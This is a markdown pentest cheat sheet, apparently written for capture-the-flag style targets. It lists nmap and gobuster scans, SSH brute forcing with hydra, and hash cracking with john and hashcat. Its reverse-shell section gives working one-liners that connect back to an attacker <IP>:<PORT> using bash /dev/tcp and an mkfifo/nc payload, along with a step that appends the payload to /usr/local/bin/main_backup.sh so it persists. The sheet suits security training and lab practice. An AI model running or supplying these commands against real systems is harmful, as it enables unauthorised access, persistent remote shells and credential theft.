# Pentest CheatSheet

## Simple shortcuts

To keep your victim adress IP choose one of this solutions :

Add the IP adress to your hosts file
```
sudo vim /etc/hosts

<IP> victim_serveur
```
Add the IP adress to your local environment. Be carreful it's not shared on all of your terminals.
```
export IP=<IP>
```

## SCAN SERVER 

-sC Scan with scripts  
-sV Scan ports and show version  
-A  Scan OS and version  
-p- Scan all ports  
-oN Output to a file  

```
nmap -sC -sV -oN nmap.log <IP>
nmap -sC -sV -A -oN nmap_all.log <IP> 
nmap -sC -sV -A -p- -oN nmap_allports.log <IP> 
```
	
## SCAN HIDDEN WEB FILES

Scan a server with web content in order to find hidden folder or files.  
-u Adress (you can precise port with ':')  
-w Dictionnary  
-x Extension file to search for  
-o Output to a file  

```
gobuster dir -u http://<IP> -w directory-list-2.3-medium.txt -o gobuster.txt
gobuster dir -u http://<IP> -w directory-list-2.3-medium.txt -o gobuster.txt -x txt,js,html,php
```
## REVERSE SHELL

CheatSheet: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

### Open a reverse shell

Victim :
```
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f" >> /usr/local/bin/main_backup.sh
```
Listener:
```
nc -lvp <PORT>
```

### Stabilyze your shell

Open a tty
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Enable autocomplete and special characters once you got a reverse shell:  
```
<CTRL-Z>  
stty raw -echo; fg <ENTER><ENTER>  
```
## HASH

### Analyze Hash :

online : 
https://www.tunnelsup.com/hash-analyzer/

cmd :
```
hashid <HASH>
hash-identifier
```
### Decrypt Hash :

online :  
https://md5decrypt.net/  
https://gchq.github.io/CyberChef/  

cmd:

Base64 decrypt:
```
echo '<HASH>' | base64 -d
```

Other :
```
john --format=<JOHN-FORMAT> --wordlist=rockyou.txt hash.txt
hashcat -m <HASHCAT-FORMAT> -a 0 -o cracked.txt hash.txt rockyou.txt
```

## BRUTEFORCE SSH

-l Single User  
-L User file  
-p Single Password  
-P Password file  
```
hydra -l <USER> -P rockyou.txt <IP> ssh -t 4
```

## TRANSFERT FILES

via ssh:
```
scp <FILE-PATH> <USER>@<IP>:<FILE-PATH>
```

Host web server on your machine and wget on the victim:
```
python3 -m http.server 4444
wget <IP>:4444
```

## USEFULL FILE

### Dictionnary

Password :  
rockyou.txt --> /usr/share/wordlists/rockyou.txt.gz  

Hidden web folder and file:  
Quite complete : directory-list-2.3-medium.txt --> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt  
Short ones more or less complete: small.txt - common.txt - big.txt --> /usr/share/dirb/wordlists/  

### Check local vulns

linpeas.sh --> https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS